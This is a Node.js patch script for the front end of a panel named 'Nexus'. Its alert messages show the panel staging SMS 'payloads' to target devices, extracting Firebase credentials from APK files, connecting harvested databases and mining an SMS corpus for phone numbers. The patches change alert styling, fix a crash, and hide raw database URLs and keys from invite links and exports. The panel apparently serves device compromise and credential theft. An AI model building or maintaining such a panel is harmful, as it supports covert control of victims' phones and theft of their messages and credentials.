const fs = require('fs');
let code = fs.readFileSync('frontend/index.html', 'utf8');

// ═══════════════════════════════════════════════════
// FIX COVERUP #1: Add explicit types to all 33 untyped customAlert() calls
// ═══════════════════════════════════════════════════

const alertFixes = [
  // SUCCESS alerts
  ["customAlert('Invite Accepted', `Securely connected to <b>${label}</b>. This is a temporary session - it will not be saved to your vault.`)", "customAlert('Invite Accepted', `Securely connected to <b>${label}</b>. This is a temporary session - it will not be saved to your vault.`, 'success')"],
  ["customAlert('Payload Staged', `The SMS command was successfully written to the device.\\n\\nFinal Payload:\\n\"${finalMsg}\"`)", "customAlert('Payload Staged', `The SMS command was successfully written to the device.\\n\\nFinal Payload:\\n\"${finalMsg}\"`, 'success')"],
  ["customAlert('Invite Token Generated',", "customAlert('Invite Token Generated',"],  // skip, multiline
  ["customAlert('Operator Created', `Operator '${user}' has been granted access to the panel.`)", "customAlert('Operator Created', `Operator '${user}' has been granted access to the panel.`, 'success')"],
  ["customAlert('Scanner Armed', `Auto-Discovery Scanner is running in the background for 30 seconds.\\n\\nMonitoring receiver: ${receiverId}\\nLooking for: ${selectedDevices.length} devices.`)", "customAlert('Scanner Armed', `Auto-Discovery Scanner is running in the background for 30 seconds.\\n\\nMonitoring receiver: ${receiverId}\\nLooking for: ${selectedDevices.length} devices.`, 'success')"],
  ["customAlert('Scanner Complete', `Auto-Discovery finished.\\nTotal numbers linked: ${matchesFound}`)", "customAlert('Scanner Complete', `Auto-Discovery finished.\\nTotal numbers linked: ${matchesFound}`, 'success')"],
  ["customAlert('Extraction Successful', 'Firebase credentials successfully extracted from the APK.')", "customAlert('Extraction Successful', 'Firebase credentials successfully extracted from the APK.', 'success')"],
  
  // ERROR alerts  
  ["customAlert('Uplink Failed', 'Could not establish connection to the Middleman API. Error: ' + (e.message || e))", "customAlert('Uplink Failed', 'Could not establish connection to the Middleman API. Error: ' + (e.message || e), 'error')"],
  ["customAlert('Missing Fields', 'Please fill in both the target phone number and payload message.')", "customAlert('Missing Fields', 'Please fill in both the target phone number and payload message.', 'error')"],
  ["customAlert('Execution Failed', 'Failed to stage the SMS payload. Target might be offline or unreachable.')", "customAlert('Execution Failed', 'Failed to stage the SMS payload. Target might be offline or unreachable.', 'error')"],
  ["customAlert('Access Denied', 'You do not have permission to edit numbers.')", "customAlert('Access Denied', 'You do not have permission to edit numbers.', 'error')"],
  ["customAlert('Missing Fields', 'Provide both a label and a valid Firebase URL.')", "customAlert('Missing Fields', 'Provide both a label and a valid Firebase URL.', 'error')"],
  ["customAlert('Connection Failed', data.message || 'Could not validate database.')", "customAlert('Connection Failed', data.message || 'Could not validate database.', 'error')"],
  ["customAlert('Delete Failed', data.message || 'Could not delete database.')", "customAlert('Delete Failed', data.message || 'Could not delete database.', 'error')"],
  ["customAlert('API Error', 'Failed to communicate with proxy backend.')", "customAlert('API Error', 'Failed to communicate with proxy backend.', 'error')"],
  ["customAlert('Access Denied', 'You do not have administrative privileges.')", "customAlert('Access Denied', 'You do not have administrative privileges.', 'error')"],
  ["customAlert('Missing Fields', 'Provide both a Username and Password.')", "customAlert('Missing Fields', 'Provide both a Username and Password.', 'error')"],
  ["customAlert('Creation Failed', data.message || 'Could not create operator account.')", "customAlert('Creation Failed', data.message || 'Could not create operator account.', 'error')"],
  ["customAlert('Access Denied', 'Telecom Intel Engine is restricted to Administrators.')", "customAlert('Access Denied', 'Telecom Intel Engine is restricted to Administrators.', 'error')"],
  ["customAlert('Discovery Failed', `Receiver device ${receiverId} not found in your connected databases.`)", "customAlert('Discovery Failed', `Receiver device ${receiverId} not found in your connected databases.`, 'error')"],
  ["customAlert('Delete Failed', 'Failed to delete the message. The database may be locked.')", "customAlert('Delete Failed', 'Failed to delete the message. The database may be locked.', 'error')"],
  ["customAlert('Invalid File', 'Only .apk files are supported for auto-extraction.')", "customAlert('Invalid File', 'Only .apk files are supported for auto-extraction.', 'error')"],
  ["customAlert('Extraction Failed', 'No Firebase configuration was found in this APK.')", "customAlert('Extraction Failed', 'No Firebase configuration was found in this APK.', 'error')"],
  ["customAlert('Error', 'Failed to parse APK. The file may be corrupted or protected.')", "customAlert('Error', 'Failed to parse APK. The file may be corrupted or protected.', 'error')"],
  
  // WARNING/INFO alerts
  ["customAlert('System Capabilities', specsHtml)", "customAlert('System Capabilities', specsHtml, 'warning')"],
  ["customAlert('Telecom Intel', 'No messages found to scan.')", "customAlert('Telecom Intel', 'No messages found to scan.', 'warning')"],
  ["customAlert('Telecom Intel', 'Scan complete. No high-confidence phone numbers were discovered in the SMS corpus.')", "customAlert('Telecom Intel', 'Scan complete. No high-confidence phone numbers were discovered in the SMS corpus.', 'warning')"],
];

for (const [find, replace] of alertFixes) {
  if (find !== replace) {
    code = code.replace(find, replace);
  }
}

// Fix the multiline Invite Token Generated alert
code = code.replace(
  /customAlert\('Invite Token Generated',\s*`The invite token for/,
  "customAlert('Invite Token Generated', `The invite token for"
);
// Find and add type to Invite Link Copied
code = code.replace(
  /customAlert\('Invite Link Copied', `\$\{copied \? 'A secure invite link' : 'The invite link'\}[^)]*\)\);/,
  (match) => match.replace(');', ", 'success');")
);

// Fix Export/Import alerts
code = code.replace('customAlert("Export Failed", "No databases connected.")', 'customAlert("Export Failed", "No databases connected.", "error")');
code = code.replace('customAlert("Import Failed", "No valid Firebase URLs found in the text file.")', 'customAlert("Import Failed", "No valid Firebase URLs found in the text file.", "error")');
code = code.replace('customAlert("Import Complete", "All Firebase URLs in the file are already connected to Nexus.")', 'customAlert("Import Complete", "All Firebase URLs in the file are already connected to Nexus.", "success")');
code = code.replace(/customAlert\("Bulk Add Complete", `Successfully connected \$\{successCount\} databases\.<br>Failed: \$\{failCount\}`\)/, 'customAlert("Bulk Add Complete", `Successfully connected ${successCount} databases.<br>Failed: ${failCount}`, "success")');


// ═══════════════════════════════════════════════════
// FIX LEAK #4: generateInviteLink — use proxy key instead of raw URL
// ═══════════════════════════════════════════════════
code = code.replace(
  "const payload = `${s.label}|||${s.base}|||${s.apiKey || ''}`;",
  "const payload = `${s.label}|||${s.key}|||invite`;"
);


// ═══════════════════════════════════════════════════
// FIX LEAK #5 + Issue #2: exportDatabases — don't dump raw URLs
// ═══════════════════════════════════════════════════
code = code.replace(
  `content += "URL: " + (s.base || s.url) + "\\n";
        if (s.key) content += "API Key: " + s.key + "\\n";`,
  `content += "Proxy Key: " + s.key + "\\n";
        content += "URL: " + (s.base || "[Hidden by Proxy]") + "\\n";`
);


// ═══════════════════════════════════════════════════  
// FIX Issue #1: Bulk import crash — renderDbList() → renderAdminDbGrid()
// ═══════════════════════════════════════════════════
code = code.replace(
  /await fetchAll\(\);\s*renderDbList\(\);/,
  'await fetchAll();\n            if (typeof renderAdminDbGrid === "function") renderAdminDbGrid();'
);


// ═══════════════════════════════════════════════════
// FIX Issue #4: Delete dead renderDbList() function
// ═══════════════════════════════════════════════════
code = code.replace(
  /function renderDbList\(\) \{[\s\S]*?document\.getElementById\('dbList'\)\.innerHTML = html[^;]*;[^}]*\}/,
  '// renderDbList() removed — replaced by renderAdminDbGrid()'
);


fs.writeFileSync('frontend/index.html', code);
console.log('All frontend fixes applied successfully.');
